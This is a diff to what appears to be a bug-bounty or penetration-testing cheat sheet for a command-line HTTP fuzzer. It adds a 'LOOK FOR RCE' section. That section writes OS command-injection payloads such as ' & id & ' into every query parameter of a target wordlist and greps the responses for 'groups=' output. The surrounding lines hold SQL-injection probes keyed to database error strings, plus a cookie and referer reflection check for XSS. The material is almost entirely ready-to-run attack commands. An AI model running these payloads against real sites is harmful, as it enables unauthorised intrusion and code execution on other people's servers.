@@ -46,6 +46,12 @@ hf @WORDLIST@ -E "IkpXVC|JKV1Q|iSldUI" --ua-chrome && hf log
 cat @WORDLIST@ | qsreplace -a "'\"" >injected.txt  
 hf injected.txt -E "SQL | SQL|mysql_fetch|SQLSTATE|ORA-" --ua-chrome && hf log
 
+💀️💀️💀️ LOOK FOR RCE
+cat @WORDLIST@ | qsreplace -a " & id & " > rce.txt
+cat @WORDLIST@ | qsreplace -a "' & id; " >> rce.txt
+cat @WORDLIST@ | qsreplace -a '" & id; ' >> rce.txt
+hf rce.txt ") groups=" --ua-chrome -A 200 -B 200 && hf log
+
 😎 INJECT COOKIE+REFERER → DETECT XSS  
 hf @WORDLIST@ "cookieORrefererReflection" -H "Cookie: cookie=cookieORrefererReflection" -H "Referer: cookieORrefererReflection" --ua-chrome -A 500 -B 500 && hf log
 #note if gbr dc has logs, use these cookies, chances_of_cookie_reflection++
